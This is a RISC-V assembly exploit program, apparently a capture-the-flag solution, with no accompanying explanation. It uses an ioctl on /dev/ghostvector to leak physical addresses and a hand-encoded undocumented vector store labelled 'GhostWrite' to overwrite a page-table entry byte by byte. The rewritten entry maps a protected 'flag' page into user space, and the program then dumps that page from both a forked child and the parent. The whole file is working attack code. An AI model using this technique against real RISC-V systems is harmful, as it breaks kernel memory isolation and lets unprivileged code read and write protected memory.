    .option arch, +v
    .section .text
    .globl _start

# helpers ------------------------------------------------------------
print:                      # a0=buf a1=len
    li a7, 64               # write
    mv a2, a1
    mv a1, a0
    li a0, 1
    ecall
    ret

print_hex64:                # a0=value ; uses stack buf at sp+32
    addi sp, sp, -16
    sd ra, 0(sp)
    mv t2, a0
    addi t3, sp, 48         # original sp+32 (we pushed 16)
    li t4, 60               # shift
1:  srl t5, t2, t4
    andi t5, t5, 15
    li t6, 10
    blt t5, t6, 2f
    addi t5, t5, 87         # 'a'-10
    j 3f
2:  addi t5, t5, 48         # '0'
3:  sb t5, 0(t3)
    addi t3, t3, 1
    addi t4, t4, -4
    bgez t4, 1b
    li t5, 10
    sb t5, 0(t3)
    addi a0, sp, 48
    li a1, 17
    call print
    ld ra, 0(sp)
    addi sp, sp, 16
    ret

gw_write:                   # a0=phys addr, a1=byte
    mv t0, a0
    mv t1, a1
    vsetivli zero, 1, e8, m1, ta, ma
    vmv.v.x v0, t1
    .word 0x10028027        # vse128.v v0, 0(t0)  (GhostWrite)
    fence
    ret

die:
    la a0, msg_err
    li a1, 4
    call print
    li a0, 1
    li a7, 93
    ecall

# main ---------------------------------------------------------------
_start:
    addi sp, sp, -128
    la a0, msg_start
    li a1, 5
    call print

    # mmap(NULL, 0x2000, PROT_RW, MAP_PRIVATE|MAP_ANON, -1, 0)
    li a0, 0
    li a1, 0x2000
    li a2, 3
    li a3, 0x22
    li a4, -1
    li a5, 0
    li a7, 222
    ecall
    bltz a0, die
    mv s1, a0               # base VA
    li t0, 0x1122334455667788
    sd t0, 0(s1)
    sd t0, 0x1000(s1)

    # openat(-100, "/dev/ghostvector", O_RDWR, 0)
    li a0, -100
    la a1, path_dev
    li a2, 2
    li a3, 0
    li a7, 56
    ecall
    bltz a0, die
    mv s2, a0               # fd

    # ioctl(fd, 0xc0184702, req)  req={VA,0,0} at sp+0
    sd s1, 0(sp)
    sd zero, 8(sp)
    sd zero, 16(sp)
    mv a0, s2
    li a1, 0xc0184702
    mv a2, sp
    li a7, 29
    ecall
    bltz a0, die
    li t0, 0x9d37c4b1a62ef059
    ld t1, 8(sp)
    xor s3, t1, t0          # pte_pa
    ld t1, 16(sp)
    xor s4, t1, t0          # flag_pa
    la a0, msg_pte
    li a1, 4
    call print
    mv a0, s3
    call print_hex64
    la a0, msg_flag
    li a1, 4
    call print
    mv a0, s4
    call print_hex64

    # ioctl for VA+0x1000 -> expect pte_pa+8
    addi t1, s1, 0x1000
    sd t1, 0(sp)
    sd zero, 8(sp)
    sd zero, 16(sp)
    mv a0, s2
    li a1, 0xc0184702
    mv a2, sp
    li a7, 29
    ecall
    bltz a0, die
    li t0, 0x9d37c4b1a62ef059
    ld t1, 8(sp)
    xor t1, t1, t0
    la a0, msg_pt2
    li a1, 4
    call print
    mv a0, t1
    call print_hex64

    # benign GhostWrite test: write 0x00 to pte_pa+7 (already 0)
    la a0, msg_gwt
    li a1, 5
    call print
    addi a0, s3, 7
    li a1, 0
    call gw_write
    la a0, msg_gwo
    li a1, 5
    call print

    # newpte = ((flag_pa>>12)<<10) | 0xd3
    srli t0, s4, 12
    slli t0, t0, 10
    ori t0, t0, 0xd3
    mv s5, t0

    # invalidate PTE byte0
    mv a0, s3
    li a1, 0
    call gw_write
    # write bytes 1..7
    li s6, 1
1:  slli t0, s6, 3
    srl t1, s5, t0
    andi a1, t1, 0xff
    add a0, s3, s6
    call gw_write
    addi s6, s6, 1
    li t2, 8
    blt s6, t2, 1b
    # write byte0 = flags
    mv a0, s3
    andi a1, s5, 0xff
    call gw_write
    la a0, msg_pat
    li a1, 5
    call print

    # fork via clone(SIGCHLD=17, 0,0,0,0)
    li a0, 17
    li a1, 0
    li a2, 0
    li a3, 0
    li a4, 0
    li a7, 220
    ecall
    bltz a0, die
    beqz a0, child
    mv s7, a0
    # wait4(pid, &status(sp+96), 0, NULL)
    mv a0, s7
    addi a1, sp, 96
    li a2, 0
    li a3, 0
    li a7, 260
    ecall
    la a0, msg_sta
    li a1, 4
    call print
    lw a0, 96(sp)
    call print_hex64

    # parent also tries to read the page
    la a0, msg_par
    li a1, 4
    call print
    li a0, 1
    mv a1, s1
    li a2, 120
    li a7, 64
    ecall
    la a0, msg_end
    li a1, 5
    call print
    li a0, 0
    li a7, 93
    ecall

child:
    la a0, msg_chi
    li a1, 4
    call print
    li a0, 1
    mv a1, s1
    li a2, 200
    li a7, 64
    ecall
    la a0, msg_nl
    li a1, 2
    call print
    li a0, 0
    li a7, 93
    ecall

    .section .rodata
msg_start: .ascii "EXP1\n"
msg_err:   .ascii "ERR\n"
msg_pte:   .ascii "PTE="
msg_flag:  .ascii "FLG="
msg_pt2:   .ascii "PT2="
msg_gwt:   .ascii "GWT_\n"
msg_gwo:   .ascii "GWO_\n"
msg_pat:   .ascii "PAT_\n"
msg_sta:   .ascii "STA="
msg_par:   .ascii "PAR<"
msg_chi:   .ascii "CHI<"
msg_nl:    .ascii ">\n"
msg_end:   .ascii "\nEND\n"
path_dev:  .asciz "/dev/ghostvector"
